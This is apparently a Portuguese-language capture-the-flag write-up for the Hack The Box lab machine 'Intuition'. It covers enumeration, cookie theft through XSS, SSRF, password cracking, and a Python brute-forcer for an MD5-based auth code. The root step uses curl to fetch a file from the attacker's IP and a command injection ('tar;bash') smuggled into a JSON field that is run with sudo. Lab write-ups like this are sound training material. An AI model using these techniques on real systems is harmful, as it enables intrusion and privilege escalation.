---
title: HTB Máquinas - Intuition
date: 2024-05-01 09:30:12 +0300
categories: [HTB, Máquinas]
tags: [máquinas, htb]     # TAG names should always be lowercase
---

# Intuition

*De antemão, peço desculpas por não fazer um post mais detalhado. Estou terminando as demandas da faculdade e estou correndo contra o relógio. Mas qualquer dúvida vocẽs podem entrar em contato comigo!*

## Enumeração
Nmap:
```
nmap -A -sV -sC 10.10.11.15                                                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-01 06:37 -03
Nmap scan report for 10.10.11.15
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://comprezzor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.23 seconds

```
```
┌──(yoshiro㉿kali)-[~]
└─$ gobuster dns -d comprezzor.htb -w subdomains-top1million-20000.txt

-comprezzor.htb

-report.comprezzor.htb

-auth.comprezzor.htb

-dashboard.comprezzor.htb
```
## Vulnerabilidade
Indo até report.comprezzor.htb, faça uma conta e realize o seguinte XSS.
![](https://i.imgur.com/69m6csl.png)

Dessa forma, será possível receber os cookies da página.

![](https://i.imgur.com/tF8EXIt.png)

Com os cookies, acesse dashboard.comprezzor.htb, e com os mesmos cookies, envie outro relatório com outro XSS e, assim que um administrador entrar para ver o relátorio, é possível roubar os cookies do adm.

![](https://i.imgur.com/lyiQtWG.png)
![](https://i.imgur.com/0E6O9n6.png)

A página de PDF é sucetivel ao ataque SSRF. 
![](https://i.imgur.com/08kHcm0.png)
![](https://i.imgur.com/G6wyUsb.png)
![](https://i.imgur.com/IU6WU3h.png)
![](https://i.imgur.com/OLSH9Hq.png)
## Usuário
![](https://i.imgur.com/6xzYnAw.png)
Para descobrir em qual usuário devemos logar no ssh, usaremos o seguinte comando:
![](https://i.imgur.com/O6WSzJV.png)

## Root

Database usando SQLite.

![](https://i.imgur.com/9lzyed9.png)

Apenas consegui quebrar a senha do Adam.

![](https://i.imgur.com/arQt2bZ.png)

Faça o login do FTP e faça o download dos seguintes arquivos:

```
ftp adam@127.0.0.1

get runner1

get runner1.c

get run-tests.sh
```

Com esses arquivos, é possível encontrar a AUTH_KEY_PREFIX e KNOWN_MD5_HASH. Com um script simples é possível o código de autorização.

```
import hashlib
import itertools
import string

AUTH_KEY_PREFIX = "UHI75GHI"
KNOWN_MD5_HASH = "0feda17076d793c2ef2870d7427ad4ed"
CHARSET = string.ascii_letters + string.digits
KEY_LENGTH = 4

def check_auth_key(suffix):
    key = f"{AUTH_KEY_PREFIX}{suffix}"
    return hashlib.md5(key.encode()).hexdigest() == KNOWN_MD5_HASH

for guess in itertools.product(CHARSET, repeat=KEY_LENGTH):
    if check_auth_key(''.join(guess)):
        print(f"Found auth key: {AUTH_KEY_PREFIX}{''.join(guess)}")
        break
else:
    print("Auth key not found.")

```

```
┌──(yoshiro㉿kali)-[~/htb]
└─$ python3 auth.py                                 
Found auth key: UHI75GHINKOP
```

Adam não tem as permissões necessárias para as executar ações relacionadas ao sys-admin, por isso, será necessário escolonar para o usuário Lopez.

Procurando no log, foi possível encontrar a pasta suricata. Utilizando o grep é possível identificar o login do Lopez.

![](https://i.imgur.com/NzwdWmV.png)

Com acesso a esse usuário, é possível acessar o runner2.
![](https://i.imgur.com/cluIOti.png)

Com algumas tentativas é erros, é possível identificar o comando que precisa ter utilizado.
![](https://i.imgur.com/tgRJEfE.png)

Para o acesso root, faça um download de algum sys-admin com meta/main.yml, por exemplo: https://github.com/coopdevs/sys-admins-role/archive/v0.0.3.tar.gz.

Após isso:

```
curl -O http://10.10.14.42:8080/sys-admins-role-0.0.3.tar.gz

mv sys-admins-role-0.0.3.tar.gz sys-admins-role.tar\;bash

echo '{"run": { "action": "install","role_file":"sys-admins-role.tar;bash"}, "auth_code": "UHI75GHINKOP"}' > yoshi.json

sudo /opt/runner2/runner2 yoshi.json
```

Você é root.